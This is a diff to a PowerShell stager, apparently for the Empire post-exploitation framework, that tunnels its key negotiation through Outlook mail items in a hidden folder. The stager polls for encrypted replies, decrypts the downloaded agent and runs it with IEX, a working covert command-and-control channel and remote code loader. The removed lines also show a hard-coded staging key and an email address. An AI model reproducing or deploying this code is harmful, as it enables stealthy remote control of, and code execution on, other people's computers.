@@ -1,5 +1,5 @@
 function Start-Negotiate {
-    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
+    param($s,$SK,$UA)
 
     function ConvertTo-RC4ByteStream {
         Param ($RCK, $In)
@@ -42,7 +42,7 @@ function Start-Negotiate {
             $AES.Mode = "CBC";
             $AES.Key = $e.GetBytes($Key);
             $AES.IV = $IV;
-            ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16)
+            ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16);
         }
     }
 
@@ -82,10 +82,6 @@ function Start-Negotiate {
     $eb=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);
     $eb=$eb+$hmac.ComputeHash($eb)[0..9];
 
-    Add-Type -assembly "Microsoft.Office.Interop.Outlook"
-    $outlook = New-Object -comobject Outlook.Application
-    $mapi = $Outlook.GetNameSpace("MAPI")
-
     # RC4 routing packet:
     #   sessionID = $ID
     #   language = POWERSHELL (1)
@@ -99,42 +95,26 @@ function Start-Negotiate {
 
     # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server
 
-    #$raw=$wc.UploadData($s+"/index.jsp","POST",$rc4p);
-    $f = $mapi.Folders | select name
-    $inf = 0
-    $cntr = 1
-    foreach ($name in $f) {
-      if($name.name -eq $UA){
-        $inf = $cntr
-      }
-      $cntr += 1
-    }
+    $c = [Convert]::ToBase64String($rc4p);
+    $mail = $outlook.CreateItem(0);
+    $mail.Subject = "mailpireout";
+    $mail.Body = "POST - "+$c;
+    $mail.save() | out-null;
+    $mail.Move($outlook.Session.GetDefaultFolder(6).Folders.Item('REPLACE_FOLDER'))| out-null;
 
-    $c = [System.BitConverter]::ToString($rc4p)
-    $mail = $outlook.CreateItem(0)
-    $mail.Subject = "mailpireout"
-    $mail.Body = "POST - "+$c
-    $mail.save() | out-null
-    $mail.Move($mapi.Folders.Item($inf).Folders.Item('Inbox').Folders.Item('tunnelmeszs'))| out-null
+    # keep checking to see if there is response
 
-    #keep checking to see if there is response
-    $break = $False
-    $bytes = ""
+    $break = $False;
+
     While ($break -ne $True){
-      foreach ($item in $mapi.Folders.Item($inf).Folders.Item('Inbox').Folders.Item('tunnelmeszs').Items) {
-        if($item.Subject -eq "mailpirein")
-        {
-          $item.HTMLBody | out-null #this seems to force the message to be fully downloaded (not just headers)
-          if($item.Body[$item.Body.Length-1] -ne '-'){ #our message needs to fully load
-            $traw = $item.Body
-            $item.Delete()
-            $break = $True
-            $t = $traw.Split('-')
-            $bytes = @()
-            Foreach ($element in $t) {
-              $bytes = $bytes + [byte]([Convert]::toInt16($element,16))
-            }
-            $raw = $bytes
+      foreach ($item in $outlook.Session.GetDefaultFolder(6).Folders.Item('REPLACE_FOLDER').Items) {
+        if($item.Subject -eq "mailpirein") {
+          $item.HTMLBody | out-null;
+          if($item.Body[$item.Body.Length-1] -ne '-') {
+            $traw = $item.Body;
+            $item.Delete();
+            $break = $True;
+            $raw = [System.Convert]::FromBase64String($traw);
           }
         }
       }
@@ -196,58 +176,45 @@ function Start-Negotiate {
     $rc4p2 = ConvertTo-RC4ByteStream -RCK $($IV2+$SKB) -In $data2;
     $rc4p2 = $IV2 + $rc4p2 + $eb2;
 
-    # the User-Agent always resets for multiple calls...silly
-
     # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
-    #$raw=$wc.UploadData($s+"/index.php","POST",$rc4p2);
-    $c = [System.BitConverter]::ToString($rc4p2)
-    $mail = $outlook.CreateItem(0)
-    $mail.Subject = "mailpireout"
-    $mail.Body = "POST - "+$c
-    $mail.save() | out-null
-    $mail.Move($mapi.Folders.Item($inf).Folders.Item('Inbox').Folders.Item('tunnelmeszs'))| out-null
+
+    $c = [Convert]::ToBase64String($rc4p2);
+    $mail = $outlook.CreateItem(0);
+    $mail.Subject = "mailpireout";
+    $mail.Body = "POST - "+$c;
+    $mail.save() | out-null;
+    $mail.Move($outlook.Session.GetDefaultFolder(6).Folders.Item('REPLACE_FOLDER'))| out-null;
 
     #keep checking to see if there is response
-    $break = $False
-    $raw = ""
+    $break = $False;
 
-    write-host "trying next part"
     While ($break -ne $True){
-      foreach ($item in $mapi.Folders.Item($inf).Folders.Item('Inbox').Folders.Item('tunnelmeszs').Items) {
-        write-host "grr"
-        if($item.Subject -eq "mailpirein")
-        {
-
-          #$item.HTMLBody | out-null #this seems to force the message to be fully downloaded (not just headers)
-          if($item.DownloadState -eq 1 -and $item.Body[$item.Body.Length-1] -ne '-'){ #our message needs to fully load
-            $item.Body.length
-            write-host "mooo"
-            $traw = $item.Body
-            $item.Delete()
-            $break = $True
-            $t = $traw.Split('-')
-            $bytes = @()
-            Foreach ($element in $t) {
-              $bytes = $bytes + [byte]([Convert]::toInt16($element,16))
-            }
-            $raw = $bytes
+      foreach ($item in $outlook.Session.GetDefaultFolder(6).Folders.Item('REPLACE_FOLDER').Items) {
+        if($item.Subject -eq "mailpirein") {
+          $item.HTMLBody | out-null;
+          if($item.DownloadState -eq 1){
+            $traw = $item.Body;
+            $item.Delete();
+            $break = $True;
+            $raw = [System.Convert]::FromBase64String($traw);
           } else {
-            $item.MarkForDownload = 1
-            $item.HTMLBody | out-null #this seems to force the message to be fully downloaded (not just headers)
+            $item.MarkForDownload = 1;
+            $item.HTMLBody | out-null;
           }
         }
       }
       Start-Sleep -s 2;
     }
-
-    # # decrypt the agent and register the agent logic
+    # decrypt the agent and register the agent logic
     # $data = $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
     # write-host "data len: $($Data.Length)";
-    #IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $praw)) );
-    $pppp =  $e.GetString($(Decrypt-Bytes -Key $key -In $raw))
-    IEX $($pppp)
-
-    #IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
+    # IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $praw)) );
+    try {
+      $pppp =  $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
+      IEX $($pppp);
+    } catch {
+      write-host $_.Exception.Message;
+    }
     # clear some variables out of memory and cleanup before execution
     $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
     [GC]::Collect();
@@ -256,4 +223,4 @@ function Start-Negotiate {
     Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID;
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
-Start-Negotiate -s "$ser" -SK '9a8d9845a6b4d82dfcb2c2e35162c831' -UA "jamesthetester@outlook.com"#$u;
+Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA 'REPLACE_EMAIL';
